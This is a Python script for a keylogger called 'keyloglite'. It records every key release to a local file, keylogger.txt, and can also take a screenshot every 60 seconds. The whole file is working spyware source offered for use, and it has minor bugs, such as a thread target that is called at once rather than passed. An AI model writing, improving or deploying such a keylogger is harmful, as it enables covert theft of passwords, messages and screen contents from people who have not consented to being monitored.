import datetime
import os
import time
import argparse
import keyboard
import pyautogui
import threading

# dict for converting special keys
special_key_dict = {'space': '<spacebar>',
                    'enter': '<enter_key>',
                    'up': '<up_key>',
                    'backspace': '<backspace>',
                    'down': '<down_key>',
                    'left': '<left_key',
                    'right': '<right_key>',
                    'escape': '<escape_key>',
                    'delete': '<delete_key>'}


class keyloglite:
    def __init__(self):
        self.logstring = ""

    # recursive function to record keystrokes, store into logstring var
    def key_event(self, event):
        stroke = event.name
        if stroke in special_key_dict:
            stroke = special_key_dict[stroke]
            self.logstring += stroke
        else:
            self.logstring += stroke
        # every 10 characters, the logstring will be written to the logger
        if len(self.logstring) > 10:
            file = open("keylogger.txt", "a")
            file.write(self.logstring)
            # clear the logstring when it's been written
            self.logstring = ""

    def screenshot(self):
        # take a screenshot every 60 seconds
        while True:
            screenshot = pyautogui.screenshot()
            screenshot.save(f'./screenshots/screenshot_{str(datetime.datetime.now())}.png')
            print('Screeny taken')
            time.sleep(60)

    def main(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--sm',
                            '--screenshot',
                            default=False,
                            action='store_true')
        args = parser.parse_args()

        print("Started KeyloggerLite")
        if args.sm:
            if os.path.exists('./screenshots'):
                print('dir exists, continuing..')
            else:
                os.mkdir('./screenshots')
            print('Screenshot mode enabled')
            threading.Thread(target=self.screenshot(),
                             daemon=True).start()
        else:
            print('Screenshot mode disabled')
        file = open("keylogger.txt", "a")
        file.write(str(datetime.datetime.now()) + f" keylogger started at {datetime.datetime.now()} \n")
        # record keystrokes and add to logstring
        keyboard.on_release(self.key_event)
        keyboard.wait()


keylogliteobj = keyloglite()
keylogliteobj.main()
